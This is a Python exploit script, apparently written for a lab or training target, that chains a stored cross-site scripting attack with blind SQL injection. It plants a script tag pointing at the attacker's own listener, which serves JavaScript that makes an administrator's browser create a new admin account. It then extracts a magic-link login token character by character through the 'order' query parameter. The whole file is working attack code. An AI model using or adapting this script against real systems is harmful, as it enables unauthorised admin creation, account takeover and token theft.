import requests 
import http.server
import socketserver
import threading
import traceback
from urllib.parse import urljoin
import sys
import argparse
from time import sleep

PROXY = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}


class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/crAdmin.js":
            self.send_response(200)
            self.send_header("Content-type", "application/javascript")
            self.end_headers()

            payload = b"""
            var http = new XMLHttpRequest();
            var url = '/admin/users/create';
            var params = 'name=randomusername&email=newadmin@user.ltd&isAdmin=true&isMod=true';
            http.open('POST', url, true);
            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            http.send(params);
            """

            self.wfile.write(payload)

            # Shut down the server after serving this request
            threading.Thread(target=self.server.shutdown, daemon=True).start()
        else:
            self.send_error(404, "File not found")


def xss(target, lhost):
    xssUrl = urljoin(target, "/question")
    xssHeaders = {"Content-Type": "application/x-www-form-urlencoded"}
    xssData = {
        "title": "i love XSS",
        "description": f"a<script src=http://{lhost}/crAdmin.js></script>em>",
        "category": "1",
    }

    def run_server():
        with socketserver.TCPServer(("", 80), Handler) as httpd:
            print(f"[*] Serving on port 80, waiting for /crAdmin.js ...")
            httpd.serve_forever()
            print("[*] Server stopped.")

    # Start server in a background thread
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()

    # Deliver the XSS payload
    try:
        print("[*] Delivering the XSS attack...")
        xssRes = requests.post(xssUrl, headers=xssHeaders, data=xssData)
        if xssRes.status_code == 200:
            print("[+] XSS attack delivered successfully. Waiting for admin...")
        else:
            print(f"[-] Failed to deliver XSS (status {xssRes.status_code})")
    except Exception as e:
        print("[-] Error delivering the XSS attack: ", e)
        traceback.print_exc()

    # Keep main thread alive while server runs
    try:
        while server_thread.is_alive():
            server_thread.join(1)
    except KeyboardInterrupt:
        print("[*] Shutting down...")

def ExfilToken(target):
    """
    Check the XSS Attack 
    """
    chkXssUrl = urljoin(target, "/profile/9")
    chkXssRes = requests.get(chkXssUrl)
    if "randomusername" in chkXssRes.text and "Administrator" in chkXssRes.text:
        print("[+] XSS Attack Succeeded")
    else: 
        print("[-] XSS Attack Failed")
        sys.exit(1)
    """
    Request a magick link
    """
    ReqMgkLnkUrl = urljoin(target, "/generateMagicLink")
    ReqMgkLnkData = {"username": "randomusername"}
    try:
        ReqMgkLnkRes = requests.post(ReqMgkLnkUrl, data=ReqMgkLnkData, proxies=PROXY)
        print("[+] Magicklink requested for user randomusername")
    except Exception as e:
        print("[-] Error requesting a magiclink: ", e)
    """
    Token Lenght 
    """
    length = 0
    while True:
        TknLenPayload = f"(SELECT CASE WHEN (SELECT LENGTH(token) FROM tokens WHERE user_id=9 LIMIT 1)={length} THEN (1) ELSE 1/(SELECT 0) END)"
        length = length +1 
        TknLenUrl = urljoin(target, f"/categories?order={TknLenPayload}")
        try:
            TknLenghtRes = requests.get(TknLenUrl, proxies=PROXY)
            if TknLenghtRes.status_code == 200:
                print(f"[+] Magiclink token length: {length}")
                break
        except Exception as e:
            print("[-] Error exfiltrating the token length: ", e)
            traceback.print_exc()
    """
    Exfil Magicklink token
    """
    token = ""
    for pos in range(1, int(length) + 1):
        for ascii_code in range(32, 127):
            exfilTknPayload = f"(SELECT CASE WHEN (SELECT (ASCII(SUBSTRING(token,{pos},1))) FROM tokens WHERE user_id=9 LIMIT 1)={ascii_code} THEN (1) ELSE 1/(SELECT 0) END)"
            exfilTknUrl = urljoin(target, f"/categories?order={exfilTknPayload}")
            try:
                exfilTknRes = requests.get(exfilTknUrl, proxies=PROXY)
                if exfilTknRes.status_code == 200:
                    sys.stdout.write(chr(ascii_code))
                    sys.stdout.flush()
                    token = token + chr(ascii_code)
            except Exception as e:
                print("[-] Error exfiltrating the token: ", e)
                traceback.print_exc()
    print("\n[+] Magiclink Token exfiltrated: ", token)
    return token

def main():
    parser = argparse.ArgumentParser(description="Exfiltrate magiclink token to get an unauthorized access to user `randomusername`")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help="listener IP")

    args = parser.parse_args()

    xss(args.target, args.lhost)

    ExfilToken(args.target)

if __name__ == "__main__":
    main()
